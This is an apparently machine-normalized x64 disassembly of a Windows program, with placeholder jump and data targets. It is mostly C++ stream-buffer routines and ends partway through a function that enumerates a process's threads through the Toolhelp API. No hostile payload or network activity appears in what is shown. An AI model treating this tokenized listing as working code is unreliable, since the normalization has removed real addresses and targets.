movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x38 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ r12 + 0x8 ] rax
sub_140010610
mov [ rsp + 0x20 ] rbx
push rsi
sub rsp 0x20
mov rbx [ rcx + 0x68 ]
lea rax [ r--data ]
mov rsi rcx
mov [ rcx ] rax
test rbx rbx
je r-xdata
lea rcx [ rsi + 0x8 ]
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rsi
jmp sub_1400382dc
mov [ rsp + 0x40 ] rdi
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rcx rbx
call j_sub_14003ad04
mov rdi [ rsp + 0x40 ]
lea rcx [ rsp + 0x30 ]
xor edx edx
mov [ rsp + 0x38 ] rbp
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebp ebp
lea rcx [ rsp + 0x30 ]
cmp [ rdi + 0x8 ] rbp
cmove rbp rdi
call sub_14003828c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rbp [ rsp + 0x38 ]
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_1400106e0
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rcx
call [ rax + 0x30 ]
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx + 0x58 ]
dec [ rax ]
mov rcx [ rbx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
movzx eax [ rdx ]
add rsp 0x20
pop rbx
retn
or eax eax
add rsp 0x20
pop rbx
retn
sub_140010720
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
xor esi esi
mov rbx r8
mov rdi rdx
mov rbp rcx
test r8 r8
jle r-xdata
mov rax rsi
jmp r-xdata
mov [ rsp + 0x30 ] r12
nop [ rax ] eax
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov rdx [ rbp ]
mov rcx rbp
call [ rdx + 0x38 ]
cmp eax 0xffffffff
je r-xdata
mov rdx [ rbp + 0x40 ]
cmp rbx rax
mov rcx rdi
mov rdx [ rdx ]
cmovl r12 rbx
mov r8 r12
call sub_14003a8c0
mov rax [ rbp + 0x58 ]
add rdi r12
sub [ rax ] r12d
mov rcx [ rbp + 0x40 ]
movsxd rax r12d
add rsi r12
sub rbx r12
add [ rcx ] rax
jmp r-xdata
mov r12 [ rsp + 0x30 ]
mov rax rsi
mov [ rdi ] al
inc rdi
inc rsi
dec rbx
test rbx rbx
jg r-xdata
mov rcx rbp
call sub_140010fd0
mov r12 rax
test rax rax
jle r-xdata
sub_1400107e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rbx r8
mov rsi rdx
mov r12 rcx
test r8 r8
jle r-xdata
mov rax rdi
jmp r-xdata
mov [ rsp + 0x30 ] rbp
nop
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov r8 [ r12 ]
movzx edx [ rsi ]
mov rcx r12
call [ r8 + 0x18 ]
cmp eax 0xffffffff
je r-xdata
mov rcx [ r12 + 0x48 ]
cmp rbx rax
mov rdx rsi
mov rcx [ rcx ]
cmovl rbp rbx
mov r8 rbp
call sub_14003a8c0
mov rax [ r12 + 0x60 ]
add rsi rbp
sub [ rax ] ebp
mov rcx [ r12 + 0x48 ]
movsxd rax ebp
add rdi rbp
sub rbx rbp
add [ rcx ] rax
jmp r-xdata
mov rbp [ rsp + 0x30 ]
mov rax rdi
inc rsi
inc rdi
dec rbx
test rbx rbx
jg r-xdata
mov rcx r12
call sub_140004720
mov rbp rax
test rax rax
jle r-xdata
sub_1400108b0
push rbx
push rbp
sub rsp 0x28
test [ rcx + 0x78 ] 0x8
mov ebp edx
mov rbx rcx
je r-xdata
cmp ebp 0xffffffff
jne r-xdata
mov r9 [ rcx + 0x48 ]
mov r8 [ r9 ]
test r8 r8
je r-xdata
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
test rdx rdx
je r-xdata
xor eax eax
add rsp 0x28
pop rbp
pop rbx
retn
mov rdx [ rcx + 0x70 ]
cmp r8 rdx
jae r-xdata
test [ rbx + 0x78 ] 0x2
je r-xdata
mov r8 [ rbx + 0x60 ]
movsxd rax [ r8 ]
add rax rdx
cmp rdx rax
jae r-xdata
mov rax [ rcx + 0x60 ]
movsxd rcx [ rax ]
mov [ r9 ] rdx
mov rax [ rbx + 0x60 ]
add rcx r8
sub ecx edx
mov [ rax ] ecx
mov [ rsp + 0x48 ] rdi
test rdx rdx
jne r-xdata
or eax 0xffffffff
add rsp 0x28
pop rbp
pop rbx
retn
dec [ r8 ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] bpl
mov eax ebp
add rsp 0x28
pop rbp
pop rbx
retn
mov rax [ rbx + 0x60 ]
movsxd rdi [ rax ]
mov rax [ rbx + 0x20 ]
sub rdi [ rax ]
add rdi rdx
xor edi edi
jmp r-xdata
test rcx rcx
je r-xdata
mov ecx 0x20
jmp r-xdata
mov rcx rdi
shr rcx 0x1
cmp rcx 0x20
jae r-xdata
or eax 0xffffffff
mov rdi [ rsp + 0x48 ]
add rsp 0x28
pop rbp
pop rbx
retn
nop [ rax ] eax
mov eax 0x7fffffff
sub rax rcx
cmp rax rdi
jae r-xdata
test rcx rcx
jne r-xdata
shr rcx 0x1
jne r-xdata
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x50 ] r12
mov [ rsp + 0x20 ] r13
lea r13 [ rcx + rdi ]
lea rcx [ rbx + 0x7c ]
mov rdx r13
call sub_140006430
mov rcx [ rbx + 0x20 ]
mov r12 [ rcx ]
mov rsi rax
test rdi rdi
je r-xdata
mov rax [ rbx + 0x28 ]
mov [ rbx + 0x70 ] rsi
mov [ rax ] rsi
mov rax [ rbx + 0x48 ]
mov [ rax ] rsi
mov rax [ rbx + 0x60 ]
mov [ rax ] r13d
mov rax [ rbx + 0x20 ]
test [ rbx + 0x78 ] 0x4
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
je r-xdata
mov r8 rdi
mov rdx r12
mov rcx rax
call sub_14003a8c0
test rdi rdi
jne r-xdata
mov [ rax ] rsi
mov rax [ rbx + 0x58 ]
mov [ rax ] 0x1
jmp r-xdata
mov [ rax ] 0x0
mov rax [ rbx + 0x58 ]
mov [ rax ] esi
jmp r-xdata
mov rcx [ rbx + 0x28 ]
mov rax rsi
sub rax r12
add [ rbx + 0x70 ] rax
mov rax [ rbx + 0x48 ]
mov rdx [ rax ]
mov rax rsi
sub rax r12
sub rdx r12
add [ rcx ] rax
mov rax [ rbx + 0x48 ]
add rdx rsi
mov [ rax ] rdx
mov rax [ rbx + 0x60 ]
mov ecx esi
sub ecx edx
add ecx r13d
mov [ rax ] ecx
test [ rbx + 0x78 ] 0x4
je r-xdata
test [ rbx + 0x78 ] 0x1
mov r13 [ rsp + 0x20 ]
mov rsi [ rsp + 0x40 ]
je r-xdata
mov rax [ rbx + 0x48 ]
mov r8 [ rax ]
mov rax [ rbx + 0x40 ]
mov rdx [ rax ]
mov rax [ rbx + 0x20 ]
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
sub rdx r12
add rdx rsi
mov [ rax ] rdx
mov rax [ rbx + 0x58 ]
sub r8d edx
inc r8d
mov [ rax ] r8d
mov rax [ rbx + 0x20 ]
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
mov [ rax ] 0x0
mov rax [ rbx + 0x58 ]
mov [ rax ] esi
jmp r-xdata
mov rax [ rbx + 0x60 ]
or [ rbx + 0x78 ] 0x1
mov r12 [ rsp + 0x50 ]
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdi [ rsp + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] bpl
mov eax ebp
add rsp 0x28
pop rbp
pop rbx
retn
mov rcx r12
call j_sub_14003ad04
sub_140010b10
mov rax [ rcx + 0x40 ]
mov r8 [ rax ]
test r8 r8
je r-xdata
or eax 0xffffffff
retn
mov rax [ rcx + 0x20 ]
cmp r8 [ rax ]
jbe r-xdata
cmp edx 0xffffffff
je r-xdata
mov rax [ rcx + 0x58 ]
inc [ rax ]
mov rax [ rcx + 0x40 ]
dec [ rax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ r8 - 0x1 ]
je r-xdata
xor edx edx
mov eax edx
retn
mov rax [ rcx + 0x40 ]
mov rcx [ rax ]
mov eax edx
mov [ rcx ] dl
retn
test [ rcx + 0x78 ] 0x2
jne r-xdata
sub_140010b60
mov r9 [ rcx + 0x40 ]
mov rdx rcx
mov r8 [ r9 ]
test r8 r8
je r-xdata
or eax 0xffffffff
retn
mov r10 [ rcx + 0x58 ]
movsxd rax [ r10 ]
add rax r8
cmp r8 rax
jae r-xdata
test [ rcx + 0x78 ] 0x4
jne r-xdata
movzx eax [ r8 ]
retn
mov rax [ rcx + 0x48 ]
mov rcx [ rax ]
test rcx rcx
je r-xdata
cmp rcx r8
ja r-xdata
cmp [ rdx + 0x70 ] rcx
jae r-xdata
cmp [ rdx + 0x70 ] r8
jbe r-xdata
mov rax [ rdx + 0x70 ]
sub eax [ r9 ]
mov [ r10 ] eax
mov rax [ rdx + 0x40 ]
mov rcx [ rax ]
movzx eax [ rcx ]
retn
mov [ rdx + 0x70 ] rcx
sub_140010bd0
push rbx
mov rbx [ rcx + 0x48 ]
mov r11 rdx
mov r10 rcx
mov rax [ rbx ]
test rax rax
je r-xdata
mov edx [ rsp + 0x30 ]
mov [ rsp + 0x10 ] rdi
test dl 0x1
je r-xdata
cmp [ rcx + 0x70 ] rax
jae r-xdata
test dl 0x2
je r-xdata
mov rax [ rcx + 0x40 ]
mov rdi [ rax ]
test rdi rdi
je r-xdata
mov [ rcx + 0x70 ] rax
test r8 r8
cmovne r8 [ r--data ]
mov rbx [ rbx ]
test rbx rbx
je r-xdata
mov rbx [ r--data ]
cmp r9d 0x2
jne r-xdata
mov rdi [ r--data ]
cmp r9d 0x2
jne r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ rcx + 0x20 ]
mov rcx [ rcx + 0x70 ]
sub rcx [ rax ]
add r8 rcx
jmp r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ rcx + 0x20 ]
mov rcx [ rcx + 0x70 ]
sub rcx [ rax ]
add r8 rcx
jmp r-xdata
test r9d r9d
je r-xdata
test dl 0x2
jne r-xdata
test r8 r8
js r-xdata
test r9d r9d
cmovne r8 rdi
mov rax [ rcx + 0x20 ]
mov rcx rbx
sub rcx [ rax ]
add r8 rcx
jmp r-xdata
test r8 r8
js r-xdata
mov r8 rbx
mov rax [ rcx + 0x20 ]
mov rcx rdi
sub rcx [ rax ]
add r8 rcx
jmp r-xdata
mov r8 rbx
jmp r-xdata
mov rax [ r10 + 0x20 ]
mov r9 [ rax ]
mov rax [ r10 + 0x70 ]
sub rax r9
cmp r8 rax
jg r-xdata
mov r8 rdi
jmp r-xdata
mov rax [ r10 + 0x20 ]
mov rdx [ rax ]
mov rax [ r10 + 0x70 ]
sub rax rdx
cmp r8 rax
jg r-xdata
mov rdi [ rsp + 0x10 ]
xor eax eax
mov [ r11 ] r8
mov [ r11 + 0x8 ] rax
mov [ r11 + 0x10 ] eax
mov rax r11
pop rbx
retn
mov rax [ r10 + 0x58 ]
sub r9d edi
add r9d r8d
sub [ rax ] r9d
mov rcx [ r10 + 0x40 ]
movsxd rax r9d
add [ rcx ] rax
test dl 0x2
je r-xdata
mov rax [ r10 + 0x60 ]
sub edx ebx
add edx r8d
sub [ rax ] edx
mov rcx [ r10 + 0x48 ]
movsxd rax edx
add [ rcx ] rax
jmp r-xdata
mov r9 [ r10 + 0x48 ]
mov rbx [ r9 ]
test rbx rbx
je r-xdata
mov rax [ r10 + 0x40 ]
mov rdx [ rax ]
mov rax [ r10 + 0x60 ]
movsxd rcx [ rax ]
mov [ r9 ] rdx
mov rax [ r10 + 0x60 ]
add rcx rbx
sub ecx edx
mov [ rax ] ecx
jmp r-xdata
sub_140010d60
mov [ rsp + 0x8 ] rbx
movsxd r10 [ r8 + 0x8 ]
mov ebx r9d
mov r9 rdx
mov rdx [ rcx + 0x48 ]
add r10 [ r8 ]
mov r11 rcx
mov rax [ rdx ]
test rax rax
je r-xdata
mov rcx [ r--data ]
cmp r10 rcx
je r-xdata
cmp [ rcx + 0x70 ] rax
jae r-xdata
mov rbx [ rsp + 0x8 ]
xor eax eax
mov [ r9 ] r10
mov [ r9 + 0x8 ] rax
mov [ r9 + 0x10 ] eax
mov rax r9
retn
test bl 0x1
je r-xdata
mov [ rcx + 0x70 ] rax
test bl 0x2
je r-xdata
mov rax [ r11 + 0x40 ]
mov r8 [ rax ]
test r8 r8
je r-xdata
mov r10 rcx
mov r8 [ rdx ]
test r8 r8
je r-xdata
test r10 r10
js r-xdata
test r10 r10
js r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
cmp r10 rax
jg r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
cmp r10 rax
jg r-xdata
mov rax [ r11 + 0x58 ]
sub edx r8d
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x40 ]
movsxd rax edx
add [ rcx ] rax
test bl 0x2
je r-xdata
mov rax [ r11 + 0x60 ]
sub edx r8d
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x48 ]
movsxd rax edx
add [ rcx ] rax
jmp r-xdata
mov r8 [ r11 + 0x48 ]
mov rbx [ r8 ]
test rbx rbx
je r-xdata
mov rax [ r11 + 0x40 ]
mov rdx [ rax ]
mov rax [ r11 + 0x60 ]
movsxd rcx [ rax ]
mov [ r8 ] rdx
mov rax [ r11 + 0x60 ]
add rcx rbx
sub ecx edx
mov [ rax ] ecx
jmp r-xdata
sub_140010e70
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x8 ]
lea rax [ r--data ]
mov ebx edx
mov r8 [ rdi ]
lea rcx [ rdi + 0x8 ]
movsxd r9 [ r8 + 0x4 ]
mov [ r9 + rcx - 0x8 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_140037d08
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140010ed0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_140037d08
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140010f10
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_140010610
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140010f40
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
test [ rcx + 0x78 ] 0x1
lea rax [ r--data ]
mov edi edx
mov [ rcx ] rax
mov rbx rcx
je r-xdata
mov rax [ rbx + 0x20 ]
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rax [ rbx + 0x28 ]
mov [ rax ] rcx
mov rax [ rbx + 0x48 ]
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
and [ rbx + 0x78 ] 0xfffffffe
mov [ rbx + 0x70 ] rcx
mov rcx rbx
call sub_140010610
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x20 ]
mov rcx [ rcx ]
call j_sub_14003ad04
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_14003ad04
sub_140010ff0
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov [ rbp - 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rbx rdx
xor esi esi
mov [ rbp - 0x40 ] esi
mov eax [ rcx + 0x78 ]
test al 0x2
jne r-xdata
test al 0x4
jne r-xdata
mov rdx [ rcx + 0x48 ]
cmp [ rdx ] rsi
je r-xdata
mov edi 0xf
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] sil
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] 0x0
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
mov rax [ rdx ]
mov r8 [ rcx + 0x70 ]
cmp r8 rax
cmovb r8 rax
mov rax [ rcx + 0x28 ]
mov rdx [ rax ]
mov edi 0xf
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] sil
sub r8 rdx
lea rcx [ rbp - 0x30 ]
call sub_140005c90
nop
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] sil
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax [ rcx + 0x58 ]
movsxd r8 [ rax ]
add r8 [ rdx ]
mov rax [ rcx + 0x20 ]
mov rdx [ rax ]
mov edi 0xf
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] sil
sub r8 rdx
lea rcx [ rbp - 0x30 ]
call sub_140005c90
nop
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] 0x0
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rbx
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x90 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] 0x0
mov rcx [ rbp - 0x18 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp rdi 0x10
jb r-xdata
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] 0x0
mov rcx [ rbp - 0x18 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
inc r8
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_14003a8c0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] 0x0
mov rcx [ rbp - 0x18 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
inc r8
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_14003a8c0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] 0x0
jmp r-xdata
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
inc r8
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_14003a8c0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] 0x0
jmp r-xdata
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x18 ] rcx
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] 0x0
jmp r-xdata
sub_140011270
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
call j_sub_14004042c
test al al
jne r-xdata
mov rdx [ rbx ]
mov rax [ rdx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx [ rbx ]
call sub_1400112c0
nop
add rsp 0x30
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_1400112f0
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
add rcx 0x8
call sub_1400382b4
nop
mov ecx 0x8
call sub_14003ac60
mov rdi rax
xor ebp ebp
test rax rax
je r-xdata
mov rdi rbp
call sub_1400380d8
mov [ rdi ] rax
call sub_140037e88
mov rsi rax
xor edx edx
lea rcx [ rsp + 0x58 ]
call sub_14003825c
mov rcx [ rsi + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x58 ]
call sub_14003828c
jmp r-xdata
inc rcx
mov [ rsi + 0x8 ] rcx
mov [ rbx + 0x68 ] rdi
lea rax [ rbx + 0x10 ]
mov [ rbx + 0x20 ] rax
lea rcx [ rbx + 0x18 ]
mov [ rbx + 0x28 ] rcx
lea rax [ rbx + 0x30 ]
mov [ rbx + 0x40 ] rax
lea rax [ rbx + 0x38 ]
mov [ rbx + 0x48 ] rax
lea rax [ rbx + 0x50 ]
mov [ rbx + 0x58 ] rax
lea rax [ rbx + 0x54 ]
mov [ rbx + 0x60 ] rax
mov [ rcx ] rbp
mov rax [ rbx + 0x48 ]
mov [ rax ] rbp
mov rax [ rbx + 0x60 ]
mov [ rax ] ebp
mov rax [ rbx + 0x20 ]
mov [ rax ] rbp
mov rax [ rbx + 0x40 ]
mov [ rax ] rbp
mov rax [ rbx + 0x58 ]
mov [ rax ] ebp
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
sub_1400113e0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x58 ] rsi
lea rdx [ rsp + 0x50 ]
call sub_140003240
nop
mov rcx rax
call sub_140011480
mov rsi rax
mov rdi [ rsp + 0x50 ]
test rdi rdi
je r-xdata
mov rax [ rsi ]
mov dl 0x20
mov rcx rsi
call [ rax + 0x30 ]
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
xor edx edx
lea rcx [ rsp + 0x48 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebx ebx
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rsp + 0x48 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_140011480
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_14003825c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_140037e88
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_140010110
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003a7f8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rcx rbx
call sub_140037db8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_1400115d0
push rbx
push rbp
push rsi
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov rsi rdx
xor edx edx
mov rbx rcx
lea ecx [ rdx + 0x4 ]
call [ CreateToolhelp32Snapshot@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
xor al al
lea rdx [ rsp + 0x20 ]
mov rcx rax
mov [ rsp + 0x80 ] r12
mov [ rsp + 0x20 ] 0x1c
call [ Thread32First@IAT ]
test eax eax
setne r12b
test r12b r12b
je r-xdata
mov rcx rbp
call [ CloseHandle@IAT ]
movzx eax r12b
mov r12 [ rsp + 0x80 ]
jmp r-xdata
mov [ rsp + 0x88 ] r13
mov r13 0x4924924924924925
mov [ rsp + 0x78 ] rdi
nop [ rax ] eax
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x50
pop rsi
pop rbp
pop rbx
retn
mov r8 [ rbx + 0x8 ]
lea rax [ rsp + 0x20 ]
cmp rax r8
jae r-xdata
mov eax [ rsp + 0x2c ]
cmp [ rsi ] eax
jne r-xdata
cmp r8 [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
lea rcx [ rsp + 0x20 ]
cmp rax rcx
ja r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rbp
call [ Thread32Next@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140011780
lea rcx [ rsp + 0x20 ]
sub rcx rax
mov rax r13
imul rcx
mov rdi rdx
sar rdi 0x3
mov rax rdi
shr rax 0x3f
add rdi rax
cmp r8 [ rbx + 0x10 ]
jne r-xdata
test rsi rsi
je r-xdata
mov r13 [ rsp + 0x88 ]
mov rdi [ rsp + 0x78 ]
add [ rbx + 0x8 ] 0x1c
mov eax [ rsp + 0x20 ]
mov [ rcx ] eax
mov eax [ rsp + 0x24 ]
mov [ rcx + 0x4 ] eax
mov eax [ rsp + 0x28 ]
mov [ rcx + 0x8 ] eax
